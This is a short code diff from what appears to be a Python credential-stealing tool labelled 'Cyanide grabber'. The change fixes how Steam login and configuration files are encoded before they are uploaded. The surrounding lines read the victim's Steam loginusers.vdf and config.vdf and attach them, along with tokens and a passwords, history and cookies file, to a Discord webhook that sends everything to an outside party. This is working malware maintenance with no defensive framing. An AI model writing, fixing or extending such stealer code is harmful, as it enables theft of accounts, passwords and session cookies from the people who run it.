@@ -67,7 +67,7 @@ class Main:
         return creds
     
     def steam(self):
-        steamUsersConf, steamConfigData = None, None
+        steamUsersConf, steamConfigData = "None", "None"
 
         steamUsers = os.path.abspath(os.path.join(os.sep, "Program Files (x86)", "Steam", "config", "loginusers.vdf"))
         steamConfig = os.path.abspath(os.path.join(os.sep, "Program Files (x86)", "Steam", "config", "config.vdf"))
@@ -126,8 +126,8 @@ class Main:
         embed = DiscordEmbed(title='Report', color="656166")
         embed.add_embed_field(name='Tokens', value=f"""```{tokens}```""")
         embed.set_footer(text='By Cyanide grabber')
-        self.webhook.add_file(file=vdf.dumps(userConfig, True).encode(), filename="SteamUsersConfig.txt")
-        self.webhook.add_file(file=vdf.dumps(steamConfig, True).encode(), filename="SteamConfig.txt")
+        self.webhook.add_file(file=userConfig.encode(), filename="SteamUsersConfig.txt")
+        self.webhook.add_file(file=steamConfig.encode(), filename="SteamConfig.txt")
         self.webhook.add_file(file=self.credsIntodict(listCreds).encode(), filename="Passwords.History.Cookies.txt")
         self.webhook.add_embed(embed)
         r = self.webhook.execute()
